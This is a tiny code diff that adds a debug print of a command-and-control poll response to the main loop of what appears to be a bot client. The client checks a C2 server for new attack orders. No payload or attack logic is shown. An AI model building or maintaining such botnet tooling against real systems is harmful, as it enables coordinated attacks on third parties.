@@ -93,6 +93,7 @@ def main():
     while True:
 
         new_attack = poll_c2(bot_id, stats)
+        print(f"[BOT {bot_id[:8]}] Poll response: {new_attack}", flush=True)
 
         if new_attack != current_attack:
 
